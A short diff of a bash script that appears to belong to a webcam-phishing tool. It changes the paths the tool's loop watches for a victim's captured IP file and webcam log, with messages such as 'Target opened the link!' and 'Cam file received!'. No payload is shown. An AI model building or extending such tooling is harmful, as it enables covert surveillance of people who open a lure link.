@@ -27,7 +27,7 @@ main(){
         while [ true ]; do
 
 
-        if [[ -e "files/webcam/ip.txt" ]]; then
+        if [[ -e "ip.txt" ]]; then
             printf "\n\e[1;92m[\e[0m+\e[1;92m] ➜ Target opened the link!\n"
             catch_ip
             rm -rf ip.txt
@@ -36,7 +36,7 @@ main(){
 
         sleep 0.5
 
-        if [[ -e "files/webcam/Log.log" ]]; then
+        if [[ -e "Log.log" ]]; then
             printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
             rm -rf Log.log
         fi
